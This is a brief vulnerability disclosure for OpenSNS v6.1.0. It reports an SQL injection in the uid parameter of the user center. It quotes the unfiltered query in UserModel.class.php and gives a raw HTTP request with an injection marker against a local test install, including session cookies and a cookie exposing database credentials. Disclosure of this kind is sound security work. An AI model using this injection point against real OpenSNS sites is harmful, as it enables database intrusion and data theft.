### OpenSNS

---
Project official：http://www.opensns.cn
Projetc address： http://www.opensns.cn/home/index/download.html

---
### $Uid SQLINJECT
When I login user center
>URL:http://127.0.0.1/opensns_v6.1.0/index.php?s=/ucenter/Config/&uid=1
![Alt text](/OpenSNSv6.1.0/img/1.png)
```bash
Debug：The getNeedQueryData function $uid in the UserModel.class.php(./Application/Common/Model/UserModel.class.php) file is not properly filtered resulting in SQLINJECT
```
```bash
Code:$query_results = D('')->query('select ' . implode(',', $need_query) . " from `{$db_prefix}member`,`{$db_prefix}ucenter_member` where uid=id and uid={$uid} limit 1");
```
* POST:
```bash
GET /opensns_v6.1.0/index.php?s=/ucenter/Config/&uid=1* HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 20cs_2132_saltkey=aZNf0Aiq; 20cs_2132_lastvisit=1562833062; PHPSESSID=jc0jgmdjmu1ihptvksahfnani0; opensns_db_config=think%3A%7B%22DB_PREFIX%22%3A%22ocenter_%22%2C%22DB_PORT%22%3A%223306%22%2C%22DB_PWD%22%3A%22root%22%2C%22DB_USER%22%3A%22root%22%2C%22DB_NAME%22%3A%22hackgo%22%2C%22DB_HOST%22%3A%22127.0.0.1%22%2C%22DB_TYPE%22%3A%22mysqli%22%7D; opensns_OX_LOGGED_USER=mQNFoONwIXTFkC7JA1j5G%3DW54F6qhcDXFdYJnW1uN-k3xNnA-foYHSB4tv74OD2hPTnFqYIZkbYZZVTJWXkGD8BQ1UExNSGMeaVxVyEimEE%3DkY0EV
Connection: close
```
>verification:
![Alt text](/OpenSNSv6.1.0/img//2.png)